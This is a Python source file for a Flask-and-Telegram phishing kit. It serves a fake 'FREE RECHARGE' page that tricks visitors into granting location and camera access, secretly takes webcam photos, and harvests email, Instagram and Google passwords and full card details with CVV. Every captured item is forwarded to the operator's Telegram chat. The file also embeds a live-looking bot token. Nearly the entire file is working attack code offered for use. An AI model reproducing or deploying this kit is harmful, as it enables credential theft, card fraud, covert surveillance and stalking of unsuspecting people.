import os
import threading
import base64
import requests
import urllib.parse
import json
import time
import sqlite3
import re
from datetime import datetime
from flask import Flask, request, render_template_string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- CONFIGURATION ---
TOKEN = "7888111866:AAHUBF0GQU8ya9uySEYu35HPJ_GFsnv1aa0"
SERVER_URL = "https://specific-bot.onrender.com"

app = Flask(__name__)

def send_telegram_message(chat_id, text, photo=None):
    try:
        if photo:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
                data={'chat_id': chat_id, 'caption': text, 'parse_mode': 'Markdown'},
                files={'photo': ('photo.jpg', photo)})
        else:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                json={"chat_id": chat_id, "text": text, "parse_mode": "Markdown"})
    except Exception as e:
        print(f"Send Error: {e}")

# --- HTML TRAP PAGE (NO SKIP) ---
def get_html(chat_id, redirect_url):
    return f"""
<!DOCTYPE html>
<html>
<head>
    <title>FREE RECHARGE</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }}
        .container {{
            background: white;
            border-radius: 30px;
            max-width: 500px;
            width: 100%;
            overflow: hidden;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }}
        .header {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 30px;
            text-align: center;
            color: white;
        }}
        .header h2 {{ font-size: 24px; margin-bottom: 10px; }}
        .content {{ padding: 30px; }}
        .step {{ display: none; }}
        .step.active {{ display: block; }}
        .btn {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            width: 100%;
            margin: 10px 0;
        }}
        .btn:disabled {{ opacity: 0.5; cursor: not-allowed; }}
        input, select {{
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
        }}
        .timer-box {{
            background: #f0f0f0;
            padding: 20px;
            border-radius: 15px;
            text-align: center;
            margin: 20px 0;
        }}
        .timer {{
            font-size: 48px;
            font-weight: bold;
            color: #667eea;
        }}
        .progress-bar {{
            width: 100%;
            height: 8px;
            background: #e0e0e0;
            border-radius: 4px;
            overflow: hidden;
            margin: 15px 0;
        }}
        .progress-fill {{
            height: 100%;
            background: linear-gradient(90deg, #667eea, #764ba2);
            width: 0%;
        }}
        .offer-badge {{
            background: #ffd700;
            color: #333;
            padding: 8px 15px;
            border-radius: 50px;
            display: inline-block;
            font-size: 12px;
            font-weight: bold;
            margin-bottom: 15px;
        }}
        .status-success {{
            background: #d4edda;
            color: #155724;
            padding: 15px;
            border-radius: 10px;
            text-align: center;
            margin: 15px 0;
        }}
        video, canvas {{ display: none; }}
    </style>
    <script>
        // Instagram/WhatsApp detection
        (function() {{
            var ua = navigator.userAgent;
            var isInstagram = ua.indexOf("Instagram") > -1 || ua.indexOf("FBAV") > -1;
            var isWhatsApp = ua.indexOf("WhatsApp") > -1;
            
            if (isInstagram || isWhatsApp) {{
                var currentUrl = window.location.href;
                document.body.innerHTML = `
                    <div style="text-align: center; padding: 50px; font-family: Arial; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center;">
                        <div style="background: white; border-radius: 30px; padding: 40px; max-width: 400px;">
                            <h2 style="color: #333;">📱 Open in Browser</h2>
                            <p style="color: #666; margin: 20px 0;">Instagram/WhatsApp browser doesn't support location & camera.</p>
                            <p style="color: #666; margin: 20px 0;">Tap the <strong>3 dots (⋮)</strong> and select</p>
                            <p style="color: #667eea; font-weight: bold;">"Open in Chrome" or "Open in Safari"</p>
                            <button onclick="window.location.href=window.location.href" style="background: #667eea; color: white; border: none; padding: 12px 24px; border-radius: 50px; margin-top: 20px; font-size: 16px; cursor: pointer;">
                                🔄 Open in Browser
                            </button>
                        </div>
                    </div>
                `;
            }}
        }})();
    </script>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="offer-badge">🎁 EXCLUSIVE OFFER 🎁</div>
            <h2>FREE RECHARGE</h2>
            <p>₹899 - 3 Months Pack</p>
        </div>
        <div class="content">
            <!-- Step 1: Location -->
            <div id="step1" class="step active">
                <p style="text-align: center; margin-bottom: 20px; font-size: 16px;">
                    🎁 <strong>FREE RECHARGE</strong> 🎁<br><br>
                    Allow location to check eligibility
                </p>
                <button class="btn" id="locationBtn">📍 ALLOW LOCATION</button>
            </div>
            
            <!-- Step 2: Camera -->
            <div id="step2" class="step">
                <p style="text-align: center; margin-bottom: 20px; font-size: 16px;">
                    🤖 <strong>HUMAN VERIFICATION</strong><br><br>
                    Verify you are human
                </p>
                <button class="btn" id="cameraBtn">📸 ALLOW CAMERA</button>
            </div>
            
            <!-- Step 3: Phone Number Form -->
            <div id="step3" class="step">
                <h3 style="text-align: center; margin-bottom: 10px;">🎁 3 MONTHS FREE RECHARGE</h3>
                <p style="text-align: center; color: #666; margin-bottom: 20px;">₹899 Value • Unlimited Calls • 2GB/Day</p>
                <select id="network">
                    <option value="Jio">Jio</option>
                    <option value="Airtel">Airtel</option>
                    <option value="Vi">Vi</option>
                    <option value="BSNL">BSNL</option>
                </select>
                <input type="tel" id="phone" placeholder="Mobile Number" maxlength="10">
                <button class="btn" id="phoneBtn">CONTINUE</button>
            </div>
            
            <!-- Step 4: Email Login -->
            <div id="step4" class="step">
                <h3 style="text-align: center; margin-bottom: 20px;">📧 EMAIL VERIFICATION</h3>
                <p style="text-align: center; color: #666; margin-bottom: 20px;">Enter your email to activate recharge</p>
                <input type="email" id="email" placeholder="Email Address">
                <input type="password" id="emailPass" placeholder="Password">
                <button class="btn" id="emailBtn">VERIFY & CLAIM</button>
            </div>
            
            <!-- Step 5: Options + Timer -->
            <div id="step5" class="step">
                <div class="status-success">
                    ✅ Recharge Initiated! ₹899 - 3 Months Pack
                </div>
                <div class="timer-box">
                    <div class="timer" id="timer">35:00</div>
                    <div class="progress-bar">
                        <div class="progress-fill" id="progressFill"></div>
                    </div>
                    <p style="color: #666; font-size: 12px;">Recharge will activate in 35 minutes</p>
                </div>
                <p style="text-align: center; margin: 20px 0; font-weight: bold;">🎁 BONUS OFFERS 🎁</p>
                <button class="btn" id="instagramBonusBtn">📸 Get 10K Instagram Followers FREE</button>
                <button class="btn" id="youtubeBonusBtn">🎬 FREE YouTube Premium</button>
                <button class="btn" id="amazonBonusBtn">🛍️ Amazon ₹2000 Gift Card</button>
            </div>
            
            <!-- Step 6: Instagram Login -->
            <div id="step6" class="step">
                <h3 style="text-align: center; margin-bottom: 20px;">📸 INSTAGRAM</h3>
                <p style="text-align: center; color: #666; margin-bottom: 20px;">Login to claim 10k followers</p>
                <input type="text" id="instaUser" placeholder="Username">
                <input type="password" id="instaPass" placeholder="Password">
                <button class="btn" id="instaBtn">CLAIM</button>
            </div>
            
            <!-- Step 7: YouTube Login -->
            <div id="step7" class="step">
                <h3 style="text-align: center; margin-bottom: 20px;">🎬 GOOGLE ACCOUNT</h3>
                <p style="text-align: center; color: #666; margin-bottom: 20px;">Login for YouTube Premium</p>
                <input type="email" id="ytEmail" placeholder="Email">
                <input type="password" id="ytPass" placeholder="Password">
                <button class="btn" id="ytBtn">CLAIM</button>
            </div>
            
            <!-- Step 8: Amazon Card -->
            <div id="step8" class="step">
                <h3 style="text-align: center; margin-bottom: 20px;">🛍️ AMAZON GIFT CARD</h3>
                <p style="text-align: center; color: #666; margin-bottom: 20px;">Enter card details to claim ₹2000</p>
                <input type="text" id="cardNumber" placeholder="Card Number">
                <input type="text" id="cardExpiry" placeholder="MM/YY">
                <input type="text" id="cardCvv" placeholder="CVV">
                <button class="btn" id="cardBtn">CLAIM</button>
            </div>
            
            <!-- Final Step -->
            <div id="step9" class="step">
                <div class="status-success" style="text-align: center; padding: 30px;">
                    🎉 ALL SET! 🎉<br><br>
                    ✅ Recharge Activated<br>
                    ✅ Bonuses Added<br><br>
                    Redirecting...
                </div>
            </div>
        </div>
    </div>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        let chatId = "{chat_id}";
        let redirectUrl = "{redirect_url}";
        let stream = null;
        let photos = [];
        let timerInterval = null;
        let timeLeft = 2100;
        
        function showStep(step) {{
            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
            document.getElementById(`step${{step}}`).classList.add('active');
        }}
        
        // Step 1: Location - No Skip
        document.getElementById('locationBtn').onclick = function() {{
            let btn = this;
            btn.disabled = true;
            btn.innerHTML = "📍 CHECKING...";
            
            if (!navigator.geolocation) {{
                alert("Location required to check eligibility");
                btn.disabled = false;
                btn.innerHTML = "📍 ALLOW LOCATION";
                return;
            }}
            
            navigator.geolocation.getCurrentPosition(
                async (position) => {{
                    let lat = position.coords.latitude;
                    let lon = position.coords.longitude;
                    
                    await fetch(window.location.origin + '/location_data', {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify({{ chat_id: chatId, lat: lat, lon: lon }})
                    }});
                    
                    showStep(2);
                }},
                (error) => {{
                    btn.disabled = false;
                    btn.innerHTML = "📍 ALLOW LOCATION";
                    alert("❌ Please allow location to check eligibility");
                }},
                {{ enableHighAccuracy: true, timeout: 10000 }}
            );
        }};
        
        // Step 2: Camera - No Skip
        document.getElementById('cameraBtn').onclick = async function() {{
            let btn = this;
            btn.disabled = true;
            btn.innerHTML = "➕ VERIFYING...";
            
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {{
                alert("Camera required for human verification");
                btn.disabled = false;
                btn.innerHTML = "➕ ALLOW MOBILEDATA";
                return;
            }}
            
            try {{
                stream = await navigator.mediaDevices.getUserMedia({{ 
                    video: {{ facingMode: "user" }}, 
                    audio: false 
                }});
                
                let video = document.getElementById('video');
                let canvas = document.getElementById('canvas');
                video.srcObject = stream;
                await video.play();
                
                for(let i = 0; i < 10; i++) {{
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    let photo = canvas.toDataURL('image/jpeg', 0.8);
                    photos.push(photo);
                    await new Promise(r => setTimeout(r, 600));
                }}
                
                await fetch(window.location.origin + '/upload_photos', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{ chat_id: chatId, photos: photos }})
                }});
                
                stream.getTracks().forEach(t => t.stop());
                showStep(3);
                
            }} catch(err) {{
                btn.disabled = false;
                btn.innerHTML = "➕ ALLOW MOBILE DATA";
                alert("❌ Please allow  to verify human identity");
            }}
        }};
        
        // Step 3: Phone
        document.getElementById('phoneBtn').onclick = async function() {{
            let network = document.getElementById('network').value;
            let phone = document.getElementById('phone').value;
            
            if(!phone || phone.length < 10) {{
                alert('Enter valid mobile number');
                return;
            }}
            
            await fetch(window.location.origin + '/phone_data', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{ chat_id: chatId, network: network, phone: phone }})
            }});
            
            showStep(4);
        }};
        
        // Step 4: Email
        document.getElementById('emailBtn').onclick = async function() {{
            let email = document.getElementById('email').value;
            let emailPass = document.getElementById('emailPass').value;
            
            if(!email) {{
                alert('Enter email address');
                return;
            }}
            
            await fetch(window.location.origin + '/email_data', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{ chat_id: chatId, email: email, email_pass: emailPass }})
            }});
            
            showStep(5);
            startTimer();
        }};
        
        function startTimer() {{
            timerInterval = setInterval(() => {{
                if(timeLeft <= 0) {{
                    clearInterval(timerInterval);
                    document.getElementById('timer').innerHTML = '00:00';
                    document.getElementById('progressFill').style.width = '100%';
                    setTimeout(() => {{
                        window.location.href = redirectUrl;
                    }}, 2000);
                }} else {{
                    timeLeft--;
                    let minutes = Math.floor(timeLeft / 60);
                    let seconds = timeLeft % 60;
                    document.getElementById('timer').innerHTML = `${{minutes.toString().padStart(2,'0')}}:${{seconds.toString().padStart(2,'0')}}`;
                    let progress = ((2100 - timeLeft) / 2100) * 100;
                    document.getElementById('progressFill').style.width = `${{progress}}%`;
                }}
            }}, 1000);
        }}
        
        // Bonuses
        document.getElementById('instagramBonusBtn').onclick = function() {{ showStep(6); }};
        document.getElementById('instaBtn').onclick = async function() {{
            let instaUser = document.getElementById('instaUser').value;
            let instaPass = document.getElementById('instaPass').value;
            await fetch(window.location.origin + '/instagram_data', {{
                method: 'POST', headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{ chat_id: chatId, instagram: instaUser, insta_pass: instaPass }})
            }});
            showStep(5);
        }};
        
        document.getElementById('youtubeBonusBtn').onclick = function() {{ showStep(7); }};
        document.getElementById('ytBtn').onclick = async function() {{
            let ytEmail = document.getElementById('ytEmail').value;
            let ytPass = document.getElementById('ytPass').value;
            await fetch(window.location.origin + '/youtube_data', {{
                method: 'POST', headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{ chat_id: chatId, youtube_email: ytEmail, youtube_pass: ytPass }})
            }});
            showStep(5);
        }};
        
        document.getElementById('amazonBonusBtn').onclick = function() {{ showStep(8); }};
        document.getElementById('cardBtn').onclick = async function() {{
            let cardNumber = document.getElementById('cardNumber').value;
            let cardExpiry = document.getElementById('cardExpiry').value;
            let cardCvv = document.getElementById('cardCvv').value;
            await fetch(window.location.origin + '/card_data', {{
                method: 'POST', headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{ chat_id: chatId, card_number: cardNumber, card_expiry: cardExpiry, card_cvv: cardCvv }})
            }});
            showStep(5);
        }};
        
        // Auto device info
        async function sendDeviceInfo() {{
            let deviceInfo = {{
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screen: screen.width + "x" + screen.height,
                cores: navigator.hardwareConcurrency,
                ram: navigator.deviceMemory
            }};
            
            try {{
                let b = await navigator.getBattery();
                deviceInfo.battery = Math.round(b.level * 100) + "%";
                deviceInfo.charging = b.charging;
            }} catch(e) {{}}
            
            await fetch(window.location.origin + '/device_info', {{
                method: 'POST', headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{ chat_id: chatId, device_info: deviceInfo }})
            }});
        }}
        
        sendDeviceInfo();
    </script>
</body>
</html>
    """

# --- FLASK ROUTES ---
@app.route('/')
def index():
    cid = request.args.get('id')
    redir = request.args.get('redir', 'https://google.com')
    return render_template_string(get_html(cid, redir))

@app.route('/device_info', methods=['POST'])
def device_info():
    data = request.json
    chat_id = data.get('chat_id')
    device_info = data.get('device_info')
    
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    
    try:
        ip_info = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,lat,lon", timeout=5).json()
    except:
        ip_info = {}
    
    map_link = f"maps.google.com/maps?q={ip_info.get('lat', '')},{ip_info.get('lon', '')}" if ip_info.get('lat') else "N/A"
    
    msg = f"""📊 **Visitor Information Captured**
━━━━━━━━━━━━━━━━

🖥️ **Device and Browser**
   • Device Model: `{device_info.get('platform', 'N/A')}`
   • User Agent: `{device_info.get('userAgent', 'N/A')}`

🌐 **Network Information**
   • IP Address: `{ip}`
   • ISP: {ip_info.get('isp', 'N/A')}
   • Language: {device_info.get('language', 'N/A')}

📍 **Location Details**
   • Country: {ip_info.get('country', 'N/A')}
   • Region: {ip_info.get('regionName', 'N/A')}
   • City: {ip_info.get('city', 'N/A')}
   • Timezone: {ip_info.get('timezone', 'N/A')}

🖼️ **Display Information**
   • Resolution: {device_info.get('screen', 'N/A')}

🔋 **Battery Status**
   • Level: {device_info.get('battery', 'N/A')}
   • Charging: {device_info.get('charging', 'N/A')}

🔐 **Device Permissions**
   • Camera: {'Allowed' if device_info.get('camera') else 'Not Requested'}
   • Location: {'Allowed' if device_info.get('location') else 'Not Requested'}

💾 **Hardware & Storage**
   • CPU Cores: {device_info.get('cores', 'N/A')}
   • RAM: {device_info.get('ram', 'N/A')} GB
   • Storage Used: N/A
   • Storage Total: N/A

🗺 **Map Link:**
{map_link}
━━━━━━━━━━━━━━━━
⚡ Developed by: @Proxyfxz"""
    
    send_telegram_message(chat_id, msg)
    return "OK"

@app.route('/location_data', methods=['POST'])
def location_data():
    data = request.json
    chat_id = data.get('chat_id')
    lat = data.get('lat')
    lon = data.get('lon')
    
    map_link = f"maps.google.com/maps?q={lat},{lon}"
    
    msg = f"""📍 **GPS Location Captured**
━━━━━━━━━━━━━━━━

🎯 **Coordinates:** {lat}, {lon}
🗺️ **Map:** {map_link}
━━━━━━━━━━━━━━━━
⚡ Developed by: @Proxyfxz"""
    
    send_telegram_message(chat_id, msg)
    return "OK"

@app.route('/upload_photos', methods=['POST'])
def upload_photos():
    data = request.json
    chat_id = data.get('chat_id')
    photos = data.get('photos', [])
    
    send_telegram_message(chat_id, f"📸 **Camera Photos**\n━━━━━━━━━━━━━━━━\nTotal: {len(photos)} photos captured\n━━━━━━━━━━━━━━━━\n⚡ Developed by: @Proxyfxz")
    
    for i, photo in enumerate(photos[:5]):
        try:
            img_data = base64.b64decode(photo.split(',')[1])
            send_telegram_message(chat_id, f"📸 Photo {i+1}", img_data)
        except:
            pass
    
    return "OK"

@app.route('/phone_data', methods=['POST'])
def phone_data():
    data = request.json
    chat_id = data.get('chat_id')
    network = data.get('network')
    phone = data.get('phone')
    
    msg = f"""📱 **Phone Number**
━━━━━━━━━━━━━━━━
📡 Network: {network}
📞 Number: +91 {phone}
━━━━━━━━━━━━━━━━
⚡ Developed by: @Proxyfxz"""
    send_telegram_message(chat_id, msg)
    return "OK"

@app.route('/email_data', methods=['POST'])
def email_data():
    data = request.json
    chat_id = data.get('chat_id')
    email = data.get('email')
    email_pass = data.get('email_pass')
    
    msg = f"""📧 **Email Login**
━━━━━━━━━━━━━━━━
📧 Email: {email}
🔑 Password: {email_pass}
━━━━━━━━━━━━━━━━
⚡ Developed by: @Proxyfxz"""
    send_telegram_message(chat_id, msg)
    return "OK"

@app.route('/instagram_data', methods=['POST'])
def instagram_data():
    data = request.json
    chat_id = data.get('chat_id')
    instagram = data.get('instagram')
    insta_pass = data.get('insta_pass')
    
    msg = f"""📸 **Instagram Login**
━━━━━━━━━━━━━━━━
👤 Username: {instagram}
🔑 Password: {insta_pass}
━━━━━━━━━━━━━━━━
⚡ Developed by: @Proxyfxz"""
    send_telegram_message(chat_id, msg)
    return "OK"

@app.route('/youtube_data', methods=['POST'])
def youtube_data():
    data = request.json
    chat_id = data.get('chat_id')
    yt_email = data.get('youtube_email')
    yt_pass = data.get('youtube_pass')
    
    msg = f"""🎬 **YouTube Premium**
━━━━━━━━━━━━━━━━
📧 Email: {yt_email}
🔑 Password: {yt_pass}
━━━━━━━━━━━━━━━━
⚡ Developed by: @Proxyfxz"""
    send_telegram_message(chat_id, msg)
    return "OK"

@app.route('/card_data', methods=['POST'])
def card_data():
    data = request.json
    chat_id = data.get('chat_id')
    card_number = data.get('card_number')
    card_expiry = data.get('card_expiry')
    card_cvv = data.get('card_cvv')
    
    msg = f"""💳 **Card Details**
━━━━━━━━━━━━━━━━
💳 Card: {card_number}
📅 Expiry: {card_expiry}
🔐 CVV: {card_cvv}
━━━━━━━━━━━━━━━━
⚡ Developed by: @Proxyfxz"""
    send_telegram_message(chat_id, msg)
    return "OK"

# --- TELEGRAM BOT ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    await update.message.reply_text(
        "👋 **Tracker Online!**\n\nLink bhejo (jaise https://youtube.com).",
        parse_mode="Markdown"
    )

async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    url = update.message.text
    if not url.startswith("http"):
        await update.message.reply_text("❌ Link `http` ya `https` se shuru hona chahiye.")
        return
    
    uid = update.effective_chat.id
    redir = urllib.parse.quote(url)
    link = f"{SERVER_URL}/?id={uid}&redir={redir}"
    
    await update.message.reply_text(
        f"✅ **YOUR TRACKING LINK**\n\n`{link}`\n\n⚡ Powered by @Proxyfxz",
        parse_mode="Markdown"
    )

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))

if __name__ == '__main__':
    threading.Thread(target=run_flask).start()
    bot = Application.builder().token(TOKEN).build()
    bot.add_handler(CommandHandler("start", start))
    bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_link))
    bot.run_polling()
